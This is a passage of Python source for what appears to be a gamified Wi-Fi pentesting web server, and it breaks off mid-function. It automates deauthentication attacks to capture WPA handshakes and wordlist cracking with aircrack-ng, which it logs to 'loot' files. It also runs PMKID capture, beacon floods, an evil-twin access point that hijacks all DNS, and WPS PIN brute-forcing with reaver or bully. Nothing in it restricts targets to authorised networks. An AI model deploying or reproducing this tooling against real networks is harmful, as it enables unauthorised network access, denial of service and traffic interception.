#!/usr/bin/env python3
"""
PWRLVL9000 — Pentesting Web UI Server
Raw-socket HTTP server — no http.server, no socketserver required.
Only needs: socket, threading, json, os, re, glob, subprocess,
            time, collections, queue, sys  (all in python3-base).
"""

import json
import subprocess
import os
import re
import glob
import threading
import time
import collections
import socket
import queue
import sys

# Optional modules — may not be in minimal python3-base on OpenWrt
try:
    import ssl as _ssl_mod
    _SSL_AVAILABLE = True
except ImportError:
    _SSL_AVAILABLE = False

try:
    import shlex as _shlex_mod
except ImportError:
    _shlex_mod = None

# ------------------------------------------------------------------ #
# Paths
# ------------------------------------------------------------------ #
_HERE    = os.path.dirname(os.path.abspath(__file__))
WEB_DIR  = os.path.join(_HERE, 'web')
PORT     = int(os.environ.get('WEBUI_PORT', 9000))
LOOT_DIR = os.environ.get('LOOT_DIR', '/root/loot/pwrlvl9000')
HS_DIR   = os.environ.get('HANDSHAKE_DIR', '/root/loot/handshakes')

try:
    os.makedirs(LOOT_DIR, exist_ok=True)
    os.makedirs(HS_DIR, exist_ok=True)
except Exception:
    for _alt in [os.path.expanduser('~/.pwrlvl_loot'), '/tmp/pwrlvl_loot']:
        try:
            LOOT_DIR = _alt
            HS_DIR   = _alt + '/handshakes'
            os.makedirs(LOOT_DIR, exist_ok=True)
            os.makedirs(HS_DIR, exist_ok=True)
            break
        except Exception:
            continue

# ------------------------------------------------------------------ #
# Global state
# ------------------------------------------------------------------ #
_lock  = threading.Lock()
_events = collections.deque(maxlen=500)
_sse_clients = []

_state = {
    'wifi_scanning':  False,
    'wifi_attacking': False,
    'web_scanning':   False,
    'net_scanning':   False,
    'attack_bssid':   None,
    'attack_iface':   None,
    'scan_iface':     None,
    # New tools
    'probe_running':  False,
    'pmkid_running':  False,
    'beacon_running': False,
    'rogueap_running': False,
    'rogueap_ssid':   None,
    'wps_scanning':   False,
    'wps_attacking':  False,
    'wps_target':     None,
    'capturing':      False,
}

_results = {
    'wifi':            [],
    'handshakes':      [],
    'webscan':         {},
    'network':         [],
    # New tools
    'probes':          {},   # mac → {mac, power, bssid, ssids, last_seen}
    'wps_aps':         [],
    'rogueap_clients': [],
}

_procs = {}  # name -> subprocess.Popen

# ------------------------------------------------------------------ #
# XP / Level system
# ------------------------------------------------------------------ #
LEVELS = [
    (0,     1,    'APPRENTICE'),
    (100,   2,    'ACOLYTE'),
    (300,   3,    'CONJURER'),
    (700,   4,    'WARLOCK'),
    (1500,  5,    'NECROMANCER'),
    (3000,  6,    'LICH'),
    (6000,  7,    'DREADLORD'),
    (12000, 8,    'ARCHLICH'),
    (25000, 9000, 'PWRLVL9000'),
]

XP_FILE = os.path.join(LOOT_DIR, 'xp.json')

def _calc_level(xp):
    level, title, xp_next = 1, 'APPRENTICE', 100
    for threshold, lvl, name in LEVELS:
        if xp >= threshold:
            level, title = lvl, name
        else:
            xp_next = threshold
            break
    else:
        xp_next = None  # max level
    return level, title, xp_next

def load_xp():
    try:
        with open(XP_FILE, 'r') as f:
            return json.load(f)
    except Exception:
        return {'xp': 0, 'level': 1, 'title': 'APPRENTICE',
                'scans': 0, 'attacks': 0, 'captures': 0, 'cracks': 0, 'ports': 0}

def _save_xp(data):
    try:
        with open(XP_FILE, 'w') as f:
            json.dump(data, f)
    except Exception:
        pass

def add_xp(amount, reason=''):
    with _lock:
        data = load_xp()
        old_level = data.get('level', 1)
        data['xp'] = data.get('xp', 0) + amount
        level, title, xp_next = _calc_level(data['xp'])
        data['level']   = level
        data['title']   = title
        data['xp_next'] = xp_next
        _save_xp(data)
    push('XP', f'+{amount} XP [{reason}] → {data["xp"]} total  LVL {level} {title}',
         {'xp': data['xp'], 'level': level, 'title': title})
    if level > old_level:
        push('XP', f'★ LEVEL UP! → LVL {level} {title} ★',
             {'level_up': True, 'level': level, 'title': title})

# ------------------------------------------------------------------ #
# Event system
# ------------------------------------------------------------------ #
def push(level, msg, data=None):
    ev = {'ts': time.time(), 'level': level, 'msg': msg}
    if data:
        ev['data'] = data
    _events.append(ev)
    dead = []
    for q in list(_sse_clients):
        try:
            q.put_nowait(ev)
        except Exception:
            dead.append(q)
    for q in dead:
        try:
            _sse_clients.remove(q)
        except Exception:
            pass

# ------------------------------------------------------------------ #
# WiFi utilities
# ------------------------------------------------------------------ #
def _run(cmd, **kw):
    try:
        kw.setdefault('timeout', 30)
        return subprocess.run(cmd, capture_output=True, text=True, **kw)
    except Exception:
        return None

def list_interfaces():
    ifaces = []
    try:
        out = _run(['iw', 'dev']).stdout
        for m in re.finditer(r'Interface\s+(\S+)', out):
            ifaces.append(m.group(1))
    except Exception:
        pass
    if not ifaces:
        try:
            out = _run(['iwconfig']).stdout
            for m in re.finditer(r'^(\w+)\s+IEEE', out, re.M):
                ifaces.append(m.group(1))
        except Exception:
            pass
    return ifaces

def set_monitor(iface, enable=True):
    """Returns the interface name to use for the requested mode.

    Firmware 2.0.0 ships dedicated monitor interfaces (wlan0mon, wlan1mon,
    wlan2mon) managed by the firmware itself. When one exists for the
    requested radio, use it directly and never bounce the managed base
    radio. On older firmware (no <iface>mon sibling), fall back to the
    classic ip/iw manual toggle, exactly as before.
    """
    if enable:
        if iface.endswith('mon'):
            return iface
        mon = iface + 'mon'
        try:
            if mon in list_interfaces():
                push('INFO', f'using firmware monitor interface {mon}')
                return mon
        except Exception:
            pass
        _run(['ip', 'link', 'set', iface, 'down'])
        _run(['iw', iface, 'set', 'type', 'monitor'])
        _run(['ip', 'link', 'set', iface, 'up'])
        return iface
    # Managed mode: never touch firmware-owned monitor interfaces.
    if iface.endswith('mon'):
        return iface
    _run(['ip', 'link', 'set', iface, 'down'])
    _run(['iw', iface, 'set', 'type', 'managed'])
    _run(['ip', 'link', 'set', iface, 'up'])
    return iface

def parse_airodump_csv(path):
    aps = []
    try:
        with open(path, 'r', errors='ignore') as f:
            content = f.read()
        sections = re.split(r'\n\s*\n', content)
        if not sections:
            return aps
        ap_section = sections[0]
        lines = ap_section.strip().splitlines()
        for line in lines[2:]:
            parts = [p.strip() for p in line.split(',')]
            if len(parts) < 14:
                continue
            bssid = parts[0].strip()
            if not re.match(r'([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}', bssid):
                continue
            ap = {
                'bssid':   bssid,
                'channel': parts[3].strip(),
                'power':   parts[8].strip(),
                'enc':     parts[5].strip(),
                'cipher':  parts[6].strip(),
                'auth':    parts[7].strip(),
                'essid':   parts[13].strip() if len(parts) > 13 else '',
                'beacons': parts[9].strip(),
            }
            aps.append(ap)
    except Exception:
        pass
    return aps

def _find_bin(*names):
    """Return first binary found in common paths, or None."""
    _dirs = [
        '/usr/sbin', '/usr/bin',
        '/usr/local/sbin', '/usr/local/bin',
        '/mmc/usr/sbin', '/mmc/usr/bin',
        '/opt/usr/sbin', '/opt/usr/bin',
        '/sbin', '/bin',
    ]
    for n in names:
        # Try `which` first — respects current PATH
        try:
            r = subprocess.run(['which', n], capture_output=True, timeout=3)
            if r.returncode == 0 and r.stdout.strip():
                return r.stdout.strip().decode('utf-8', errors='ignore').strip()
        except Exception:
            pass
        # Then check common directories directly
        for d in _dirs:
            cand = f'{d}/{n}'
            try:
                if os.path.isfile(cand):
                    return cand
            except Exception:
                pass
    return None

def _parse_iw_scan(output):
    """Parse 'iw dev <iface> scan' output into AP dicts."""
    aps = []
    cur = {}
    for line in output.splitlines():
        line_s = line.strip()
        m = re.match(r'BSS ([0-9a-fA-F:]{17})', line_s)
        if m:
            if cur.get('bssid'):
                aps.append(cur)
            cur = {'bssid': m.group(1), 'essid': '', 'channel': '',
                   'power': '', 'enc': 'OPN', 'cipher': '', 'auth': '', 'beacons': '0'}
            continue
        if not cur:
            continue
        m2 = re.match(r'SSID:\s*(.*)', line_s)
        if m2:
            cur['essid'] = m2.group(1).strip()
            continue
        m3 = re.match(r'signal:\s*(-?\d+(?:\.\d+)?)', line_s)
        if m3:
            cur['power'] = str(int(float(m3.group(1))))
            continue
        m4 = re.match(r'DS Parameter set: channel (\d+)', line_s)
        if m4:
            cur['channel'] = m4.group(1)
            continue
        m5 = re.match(r'primary channel:\s*(\d+)', line_s)
        if m5 and not cur.get('channel'):
            cur['channel'] = m5.group(1)
            continue
        if 'RSN:' in line_s or 'WPA2' in line_s:
            cur['enc'] = 'WPA2'
        elif 'WPA:' in line_s and cur.get('enc') != 'WPA2':
            cur['enc'] = 'WPA'
    if cur.get('bssid'):
        aps.append(cur)
    return aps

def _wifi_scan_iw(iface, duration):
    """Fallback scan using 'iw dev scan' — no monitor mode needed."""
    push('INFO', f'iw scan mode on {iface} (passive, no capture)')
    seen = {}
    end = time.time() + duration
    while time.time() < end and _state['wifi_scanning']:
        r = _run(['iw', 'dev', iface, 'scan'], timeout=20)
        if r and r.stdout:
            for ap in _parse_iw_scan(r.stdout):
                if ap['bssid']:
                    seen[ap['bssid']] = ap
        if seen:
            aps = list(seen.values())
            with _lock:
                _results['wifi'] = aps
            push('SCAN', f'Found {len(aps)} APs (iw scan)', {'aps': aps})
        time.sleep(5)
    aps = list(seen.values())
    push('SCAN', f'iw scan complete — {len(aps)} APs', {'aps': aps})

def _wifi_scan_airodump(iface, duration, airodump_bin):
    """Full scan with airodump-ng (monitor mode, handshake capture possible)."""
    tmp_prefix = '/tmp/pwrlvl_scan'
    tmp_csv    = tmp_prefix + '-01.csv'

    iface = set_monitor(iface, True)
    push('INFO', f'Monitor mode enabled on {iface}')

    for f in glob.glob(tmp_prefix + '*'):
        try:
            os.remove(f)
        except Exception:
            pass

    try:
        proc = subprocess.Popen(
            [airodump_bin, '--output-format', 'csv',
             '--write', tmp_prefix, '--write-interval', '3', iface],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )
    except Exception as e:
        push('ERROR', f'airodump-ng launch failed ({airodump_bin}): {e}')
        push('WARN', 'Falling back to passive iw scan')
        _wifi_scan_iw(iface, duration)
        return
    with _lock:
        _procs['scan'] = proc

    end = time.time() + duration
    last_count = 0
    while time.time() < end:
        if not _state['wifi_scanning']:
            break
        time.sleep(3)
        if os.path.exists(tmp_csv):
            aps = parse_airodump_csv(tmp_csv)
            with _lock:
                _results['wifi'] = aps
            if len(aps) != last_count:
                new_aps = len(aps) - last_count
                if new_aps > 0:
                    add_xp(new_aps * 2, f'{new_aps} new APs')
                last_count = len(aps)
                push('SCAN', f'Found {len(aps)} APs', {'aps': aps})

    proc.terminate()
    try:
        proc.wait(timeout=3)
    except Exception:
        proc.kill()

    if os.path.exists(tmp_csv):
        aps = parse_airodump_csv(tmp_csv)
        with _lock:
            _results['wifi'] = aps
        push('SCAN', f'Scan complete — {len(aps)} APs', {'aps': aps})
    else:
        push('WARN', 'airodump-ng produced no CSV — trying iw fallback')
        _wifi_scan_iw(iface, max(10, duration // 2))

def wifi_scan_thread(iface, duration=30):
    push('INFO', f'Starting WiFi scan on {iface} for {duration}s...')
    add_xp(5, 'scan started')
    with _lock:
        _state['wifi_scanning'] = True
        _state['scan_iface'] = iface

    try:
        airodump_bin = _find_bin('airodump-ng')
        if airodump_bin:
            push('INFO', f'Using {airodump_bin}')
            _wifi_scan_airodump(iface, duration, airodump_bin)
        else:
            push('WARN', 'airodump-ng not found — passive iw scan (no WPA capture)')
            _wifi_scan_iw(iface, duration)
    except Exception as e:
        push('ERROR', f'Scan error: {e}')
    finally:
        with _lock:
            _state['wifi_scanning'] = False
            _procs.pop('scan', None)

def wifi_attack_thread(bssid, channel, iface, count=0):
    push('ATTACK', f'Starting deauth → {bssid} ch{channel} on {iface}')
    add_xp(10, 'attack started')
    with _lock:
        _state['wifi_attacking'] = True
        _state['attack_bssid']   = bssid
        _state['attack_iface']   = iface

    airodump_bin = _find_bin('airodump-ng')
    aireplay_bin = _find_bin('aireplay-ng')
    if not airodump_bin or not aireplay_bin:
        push('ERROR', 'aircrack-ng suite not found — install with: opkg install aircrack-ng')
        with _lock:
            _state['wifi_attacking'] = False
        return

    cap_file = os.path.join(HS_DIR, f'cap_{bssid.replace(":", "")}')

    try:
        iface = set_monitor(iface, True)
        _run(['iw', iface, 'set', 'channel', str(channel)])

        cap_proc = subprocess.Popen(
            [airodump_bin, '-c', str(channel), '--bssid', bssid,
             '--output-format', 'pcap', '--write', cap_file, iface],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )
        with _lock:
            _procs['capture'] = cap_proc

        time.sleep(2)

        burst = int(count) if count else 0
        deauth_cmd = [aireplay_bin, '--deauth', str(burst) if burst else '0',
                      '-a', bssid, iface]
        push('ATTACK', f'Sending deauth frames (burst={burst if burst else "∞"})...')

        if burst:
            deauth_proc = subprocess.Popen(
                deauth_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
            )
            with _lock:
                _procs['deauth'] = deauth_proc
            deauth_proc.wait()
            push('ATTACK', 'Deauth burst complete, watching for handshake...')
            time.sleep(15)
        else:
            deauth_proc = subprocess.Popen(
                deauth_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
            )
            with _lock:
                _procs['deauth'] = deauth_proc
            while _state['wifi_attacking']:
                time.sleep(2)
            deauth_proc.terminate()

        cap_proc.terminate()
        try:
            cap_proc.wait(timeout=3)
        except Exception:
            cap_proc.kill()

        cap_pcap = cap_file + '-01.cap'
        if os.path.exists(cap_pcap):
            add_xp(50, 'handshake captured')
            with _lock:
                d = load_xp(); d['captures'] = d.get('captures', 0) + 1; _save_xp(d)
            push('ATTACK', f'Capture saved: {os.path.basename(cap_pcap)}')
        else:
            push('WARN', 'No capture file created')

    except Exception as e:
        push('ERROR', f'Attack error: {e}')
    finally:
        with _lock:
            _state['wifi_attacking'] = False
            _procs.pop('capture', None)
            _procs.pop('deauth', None)

def crack_thread(cap_file, wordlist):
    push('CRACK', f'Starting aircrack-ng on {os.path.basename(cap_file)}...')
    cap_path = os.path.join(HS_DIR, cap_file)
    if not os.path.exists(cap_path):
        push('ERROR', f'File not found: {cap_file}')
        return
    if not os.path.exists(wordlist):
        push('ERROR', f'Wordlist not found: {wordlist}')
        return
    aircrack_bin = _find_bin('aircrack-ng')
    if not aircrack_bin:
        push('ERROR', 'aircrack-ng not found — install with: opkg install aircrack-ng')
        return
    try:
        result = subprocess.run(
            [aircrack_bin, '-w', wordlist, cap_path],
            capture_output=True, text=True, timeout=300
        )
        out = result.stdout + result.stderr
        m = re.search(r'KEY FOUND!\s*\[\s*(.+?)\s*\]', out)
        if m:
            key = m.group(1)
            add_xp(200, 'password cracked')
            with _lock:
                d = load_xp(); d['cracks'] = d.get('cracks', 0) + 1; _save_xp(d)
            push('CRACK', f'PASSWORD FOUND: {key}', {'key': key, 'file': cap_file})
            loot_file = os.path.join(LOOT_DIR, 'cracked.txt')
            with open(loot_file, 'a') as f:
                f.write(f'{cap_file}:{key}\n')
        else:
            push('CRACK', 'Password not in wordlist')
    except subprocess.TimeoutExpired:
        push('CRACK', 'Crack timed out (300s)')
    except Exception as e:
        push('ERROR', f'Crack error: {e}')

# ------------------------------------------------------------------ #
# Probe Sniffer / Client Tracker
# ------------------------------------------------------------------ #
def parse_airodump_clients(path):
    """Parse client/probe section of airodump-ng CSV."""
    clients = {}
    try:
        with open(path, 'r', errors='ignore') as f:
            content = f.read()
        sections = re.split(r'\n\s*\n', content)
        if len(sections) < 2:
            return clients
        for line in sections[1].strip().splitlines()[1:]:
            parts = [p.strip() for p in line.split(',')]
            if len(parts) < 6:
                continue
            mac = parts[0].strip()
            if not re.match(r'([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}', mac):
                continue
            bssid = parts[5].strip() if len(parts) > 5 else ''
            probed_raw = ','.join(parts[6:]) if len(parts) > 6 else ''
            ssids = [s.strip() for s in probed_raw.split(',') if s.strip()]
            clients[mac] = {
                'mac':       mac,
                'power':     parts[3].strip() if len(parts) > 3 else '',
                'bssid':     None if bssid in ('(not associated)', '') else bssid,
                'ssids':     ssids,
                'last_seen': parts[2].strip() if len(parts) > 2 else '',
            }
    except Exception:
        pass
    return clients

def probe_scan_thread(iface, duration=60):
    push('INFO', f'Probe scan on {iface} for {duration}s...')
    add_xp(5, 'probe scan')
    with _lock:
        _state['probe_running'] = True
    tmp_prefix = '/tmp/pwrlvl_probe'
    tmp_csv    = tmp_prefix + '-01.csv'
    try:
        airodump_bin = _find_bin('airodump-ng')
        if not airodump_bin:
            push('ERROR', 'airodump-ng not found — install: opkg install aircrack-ng')
            return
        iface = set_monitor(iface, True)
        for f in glob.glob(tmp_prefix + '*'):
            try: os.remove(f)
            except: pass
        try:
            proc = subprocess.Popen(
                [airodump_bin, '--output-format', 'csv',
                 '--write', tmp_prefix, '--write-interval', '2', iface],
                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
            )
        except Exception as e:
            push('ERROR', f'airodump-ng launch failed: {e}')
            return
        with _lock:
            _procs['probe'] = proc
        end = time.time() + duration
        while time.time() < end and _state['probe_running']:
            time.sleep(3)
            if os.path.exists(tmp_csv):
                clients = parse_airodump_clients(tmp_csv)
                with _lock:
                    _results['probes'] = clients
                probing = [c for c in clients.values() if c['ssids']]
                if probing:
                    push('PROBE', f'{len(probing)} probing devices ({len(clients)} total)',
                         {'probes': probing})
        proc.terminate()
        try: proc.wait(timeout=3)
        except: proc.kill()
        clients = parse_airodump_clients(tmp_csv) if os.path.exists(tmp_csv) else {}
        with _lock:
            _results['probes'] = clients
        probing = [c for c in clients.values() if c['ssids']]
        push('PROBE', f'Done — {len(probing)} probing, {len(clients)} total',
             {'probes': probing})
        if probing:
            add_xp(len(probing), 'probe records')
    except Exception as e:
        push('ERROR', f'Probe scan error: {e}')
    finally:
        with _lock:
            _state['probe_running'] = False
            _procs.pop('probe', None)

# ------------------------------------------------------------------ #
# PMKID Capture
# ------------------------------------------------------------------ #
def pmkid_thread(iface, duration=60):
    push('INFO', f'PMKID capture on {iface} for {duration}s...')
    add_xp(5, 'PMKID capture')
    with _lock:
        _state['pmkid_running'] = True
    try:
        hcx_bin = _find_bin('hcxdumptool')
        if not hcx_bin:
            push('ERROR', 'hcxdumptool not found — install: opkg install hcxdumptool')
            return
        out_file = os.path.join(HS_DIR, f'pmkid_{int(time.time())}.pcapng')
        iface = set_monitor(iface, False)
        time.sleep(0.5)
        try:
            proc = subprocess.Popen(
                [hcx_bin, '-i', iface, '-o', out_file, '--enable_status=3'],
                stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True,
            )
        except Exception as e:
            push('ERROR', f'hcxdumptool failed: {e}')
            return
        with _lock:
            _procs['pmkid'] = proc
        end = time.time() + duration
        while time.time() < end and _state['pmkid_running']:
            try:
                line = proc.stdout.readline()
                if not line:
                    break
                line = line.strip()
                if line:
                    push('PMKID', line)
                    if 'pmkid' in line.lower() or 'eapol' in line.lower():
                        add_xp(75, 'PMKID/EAPOL captured')
            except Exception:
                break
        proc.terminate()
        try: proc.wait(timeout=3)
        except: proc.kill()
        if os.path.exists(out_file):
            push('PMKID', f'Saved: {os.path.basename(out_file)} ({os.path.getsize(out_file)} B)')
        else:
            push('WARN', 'No capture file produced')
    except Exception as e:
        push('ERROR', f'PMKID error: {e}')
    finally:
        with _lock:
            _state['pmkid_running'] = False
            _procs.pop('pmkid', None)

# ------------------------------------------------------------------ #
# Beacon Flood
# ------------------------------------------------------------------ #
def beacon_flood_thread(iface, ssids='', channel=6):
    push('BEACON', f'Beacon flood on {iface} ch{channel}...')
    add_xp(5, 'beacon flood')
    with _lock:
        _state['beacon_running'] = True
    ssid_file = '/tmp/pwrlvl_ssids.txt'
    try:
        mdk_bin = _find_bin('mdk4', 'mdk3')
        if not mdk_bin:
            push('ERROR', 'mdk4/mdk3 not found — install: opkg install mdk4')
            return
        iface = set_monitor(iface, True)
        ssid_list = [s.strip() for s in ssids.split('\n') if s.strip()]
        if ssid_list:
            with open(ssid_file, 'w') as f:
                f.write('\n'.join(ssid_list) + '\n')
            cmd = [mdk_bin, iface, 'b', '-f', ssid_file, '-c', str(channel)]
        else:
            cmd = [mdk_bin, iface, 'b', '-c', str(channel)]
        try:
            proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        except Exception as e:
            push('ERROR', f'mdk failed: {e}')
            return
        with _lock:
            _procs['beacon'] = proc
        push('BEACON', f'Flooding ch{channel} ({len(ssid_list) or "random"} SSIDs) — press STOP')
        while _state['beacon_running']:
            if proc.poll() is not None:
                push('WARN', 'mdk exited unexpectedly')
                break
            time.sleep(1)
        proc.terminate()
        try: proc.wait(timeout=3)
        except: proc.kill()
        push('BEACON', 'Beacon flood stopped')
    except Exception as e:
        push('ERROR', f'Beacon flood error: {e}')
    finally:
        with _lock:
            _state['beacon_running'] = False
            _procs.pop('beacon', None)
        try: os.remove(ssid_file)
        except: pass

# ------------------------------------------------------------------ #
# Rogue AP / Evil Twin
# ------------------------------------------------------------------ #
_ROGUEAP_CONF    = '/tmp/pwrlvl_hostapd.conf'
_ROGUEAP_DM_CONF = '/tmp/pwrlvl_dnsmasq_ra.conf'
_ROGUEAP_DM_PID  = '/tmp/pwrlvl_dnsmasq_ra.pid'
_ROGUEAP_IP      = '192.168.69.1'

def rogueap_thread(ssid, channel, iface, password=''):
    push('ROGUEAP', f'Starting rogue AP "{ssid}" ch{channel} on {iface}')
    add_xp(10, 'rogue AP')
    with _lock:
        _state['rogueap_running']  = True
        _state['rogueap_ssid']     = ssid
        _results['rogueap_clients'] = []
    try:
        hostapd_bin = _find_bin('hostapd')
        if not hostapd_bin:
            push('ERROR', 'hostapd not found')
            return
        iface = set_monitor(iface, False)
        time.sleep(0.5)
        conf = (
            f'interface={iface}\ndriver=nl80211\nssid={ssid}\n'
            f'hw_mode=g\nchannel={channel}\nignore_broadcast_ssid=0\n'
        )
        if password and len(password) >= 8:
            conf += (
                f'wpa=2\nwpa_passphrase={password}\n'
                f'wpa_key_mgmt=WPA-PSK\nrsn_pairwise=CCMP\n'
            )
        with open(_ROGUEAP_CONF, 'w') as f:
            f.write(conf)
        _run(['ip', 'addr', 'flush', 'dev', iface])
        _run(['ip', 'addr', 'add', f'{_ROGUEAP_IP}/24', 'dev', iface])
        _run(['ip', 'link', 'set', iface, 'up'])
        try:
            proc = subprocess.Popen(
                [hostapd_bin, _ROGUEAP_CONF],
                stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True,
            )
        except Exception as e:
            push('ERROR', f'hostapd failed: {e}')
            return
        with _lock:
            _procs['rogueap'] = proc
        time.sleep(2)
        if proc.poll() is not None:
            out = proc.stdout.read(500)
            push('ERROR', f'hostapd exited immediately: {out[:200]}')
            return
        dnsmasq_bin = _find_bin('dnsmasq')
        if dnsmasq_bin:
            dm_conf = (
                f'interface={iface}\nbind-interfaces\n'
                f'dhcp-range=192.168.69.10,192.168.69.100,12h\n'
                f'dhcp-option=3,{_ROGUEAP_IP}\ndhcp-option=6,{_ROGUEAP_IP}\n'
                f'address=/#/{_ROGUEAP_IP}\nno-resolv\n'
                f'pid-file={_ROGUEAP_DM_PID}\n'
            )
            with open(_ROGUEAP_DM_CONF, 'w') as f:
                f.write(dm_conf)
            try:
                subprocess.Popen(
                    [dnsmasq_bin, '-C', _ROGUEAP_DM_CONF],
                    stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                )
            except Exception:
                pass
        enc_txt = f'WPA2 pw={password}' if password else 'OPEN'
        push('ROGUEAP', f'"{ssid}" ONLINE  {iface} @ {_ROGUEAP_IP}  [{enc_txt}]')
        seen = set()
        leases_file = '/tmp/dnsmasq.leases'
        while _state['rogueap_running']:
            if proc.poll() is not None:
                push('WARN', 'hostapd stopped unexpectedly')
                break
            try:
                if os.path.exists(leases_file):
                    with open(leases_file) as f:
                        for line in f:
                            parts = line.strip().split()
                            if len(parts) >= 3:
                                mac = parts[1]; ip = parts[2]
                                hostname = parts[3] if len(parts) > 3 else ''
                                if mac not in seen:
                                    seen.add(mac)
                                    add_xp(20, 'rogue AP client connected')
                                    push('ROGUEAP', f'Client: {mac}  {ip}  {hostname}',
                                         {'mac': mac, 'ip': ip, 'hostname': hostname})
                                    with _lock:
                                        _results['rogueap_clients'].append(
                                            {'mac': mac, 'ip': ip, 'hostname': hostname})
            except Exception:
                pass
            time.sleep(3)
        proc.terminate()
        try: proc.wait(timeout=3)
        except: proc.kill()
        try:
            if os.path.exists(_ROGUEAP_DM_PID):
                with open(_ROGUEAP_DM_PID) as f:
                    os.kill(int(f.read().strip()), 15)
        except Exception:
            pass
        push('ROGUEAP', f'Rogue AP "{ssid}" stopped')
    except Exception as e:
        push('ERROR', f'Rogue AP error: {e}')
    finally:
        with _lock:
            _state['rogueap_running'] = False
            _state['rogueap_ssid']    = None
            _procs.pop('rogueap', None)
        for f in (_ROGUEAP_CONF, _ROGUEAP_DM_CONF):
            try: os.remove(f)
            except: pass

# ------------------------------------------------------------------ #
# WPS Scanner + Attack
# ------------------------------------------------------------------ #
def parse_wash_output(text):
    aps = []
    for line in text.splitlines():
        line = line.strip()
        if not line or line.startswith('BSSID') or line.startswith('-'):
            continue
        m = re.match(
            r'([0-9a-fA-F:]{17})\s+(\d+)\s+(-?\d+)\s+([\d.]+)\s+(Yes|No)\s+(\S*)\s*(.*)',
            line
        )
        if m:
            aps.append({
                'bssid':   m.group(1),
                'channel': m.group(2),
                'power':   m.group(3),
                'version': m.group(4),
                'locked':  m.group(5) == 'Yes',
                'vendor':  m.group(6),
                'essid':   m.group(7).strip(),
            })
    return aps

def wps_scan_thread(iface, duration=30):
    push('INFO', f'WPS scan on {iface} for {duration}s...')
    add_xp(5, 'WPS scan')
    with _lock:
        _state['wps_scanning'] = True
    try:
        wash_bin = _find_bin('wash')
        if not wash_bin:
            push('ERROR', 'wash not found — install: opkg install reaver')
            return
        iface = set_monitor(iface, True)
        try:
            proc = subprocess.Popen(
                [wash_bin, '-i', iface],
                stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True,
            )
        except Exception as e:
            push('ERROR', f'wash failed: {e}')
            return
        with _lock:
            _procs['wps_scan'] = proc
        buf = ''
        end = time.time() + duration
        while time.time() < end and _state['wps_scanning']:
            try:
                line = proc.stdout.readline()
                if not line:
                    break
                buf += line
            except Exception:
                break
        proc.terminate()
        try: proc.wait(timeout=3)
        except: proc.kill()
        aps = parse_wash_output(buf)
        with _lock:
            _results['wps_aps'] = aps
        push('WPS', f'Found {len(aps)} WPS-enabled APs', {'aps': aps})
        if aps:
            add_xp(len(aps) * 5, f'{len(aps)} WPS APs found')
    except Exception as e:
        push('ERROR', f'WPS scan error: {e}')
    finally:
        with _lock:
            _state['wps_scanning'] = False
            _procs.pop('wps_scan', None)

def wps_attack_thread(bssid, channel, iface):
    push('WPS', f'WPS attack → {bssid} ch{channel} on {iface}')
    add_xp(10, 'WPS attack')
    with _lock:
        _state['wps_attacking'] = True
        _state['wps_target']    = bssid
    try:
        reaver_bin = _find_bin('reaver')
        bully_bin  = _find_bin('bully')
        atk_bin    = reaver_bin or bully_bin
        if not atk_bin:
            push('ERROR', 'reaver/bully not found — install: opkg install reaver')
            return
        iface = set_monitor(iface, True)
        if reaver_bin:
            cmd = [reaver_bin, '-i', iface, '-b', bssid,
                   '-c', str(channel), '-vv', '-K', '1']
        else:
            cmd = [bully_bin, '-b', bssid, '-c', str(channel), '-v', '3', iface]
        try:
            proc = subprocess.Popen(
                cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True,
            )
        except Exception as e:
            push('ERROR', f'WPS attack failed: {e}')
            return
        with _lock:
            _procs['wps_attack'] = proc
        pin_found = None
        while _state['wps_attacking']:
            try:
                line = proc.stdout.readline()
                if not line:
                    break
                line = line.strip()
                if not line:
                    continue
                push('WPS', line)
                m_pin = re.search(r'WPS\s+PIN[:\s]+[\'"]?(\d{4,8})[\'"]?', line, re.I)
                m_psk = re.search(r'WPA\s+PSK[:\s]+[\'"]?([^\'"]+)[\'"]?', line, re.I)
                if m_pin:
                    pin_found = m_pin.group(1)
                    push('WPS', f'★ PIN FOUND: {pin_found} ★', {'pin': pin_found})
                    add_xp(100, 'WPS PIN cracked')
                if m_psk:
                    psk = m_psk.group(1)
                    push('WPS', f'★ PSK: {psk} ★', {'psk': psk})
                    add_xp(200, 'WPS→PSK recovered')
                    with open(os.path.join(LOOT_DIR, 'wps_cracked.txt'), 'a') as f:
                        f.write(f'{bssid}  PIN:{pin_found or "?"}  PSK:{psk}\n')
            except Exception:
                break
        proc.terminate()
        try: proc.wait(timeout=3)
        except: proc.kill()
    except Exception as e:
        push('ERROR', f'WPS attack error: {e}')
    finally:
        with _lock:
            _state['wps_attacking'] = False
            _state['wps_target']    = None
            _procs.pop('wps_attack', None)

# ------------------------------------------------------------------ #
# Packet Capture
# ------------------------------------------------------------------ #
def list_pcaps():
    files = []
    for pat in ['*.pcap', '*.pcapng']:
        for f in glob.glob(os.path.join(LOOT_DIR, pat)):
            stat = os.stat(f)
            files.append({'name': os.path.basename(f),
                          'size': stat.st_size, 'mtime': stat.st_mtime})
    files.sort(key=lambda x: x['mtime'], reverse=True)
    return files

def capture_thread(iface, filter_expr='', duration=60):
    push('CAPTURE', f'Capturing on {iface} ({duration}s)...')
    add_xp(5, 'packet capture')
    with _lock:
        _state['capturing'] = True
    cap_file = os.path.join(LOOT_DIR, f'cap_{int(time.time())}.pcap')
    try:
        tcpdump_bin = _find_bin('tcpdump')
        if not tcpdump_bin:
            push('ERROR', 'tcpdump not found — install: opkg install tcpdump')
            return
        cmd = [tcpdump_bin, '-i', iface, '-w', cap_file, '-n', '-s', '0']
        if filter_expr.strip():
            if _shlex_mod:
                cmd += _shlex_mod.split(filter_expr.strip())
            else:
                cmd += filter_expr.strip().split()
        try:
            proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
